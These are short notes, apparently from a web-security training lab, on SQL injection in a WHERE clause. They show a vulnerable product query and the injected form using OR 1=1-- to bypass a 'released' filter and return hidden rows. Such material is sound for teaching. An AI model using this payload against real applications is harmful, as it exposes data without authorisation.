# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Vulnerable query: ` SELECT * FROM products WHERE category = 'Gifts' AND released = 1 `

Exploit path: ` SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- `

The above will always select all from products because `OR 1=1` always evaluates to true
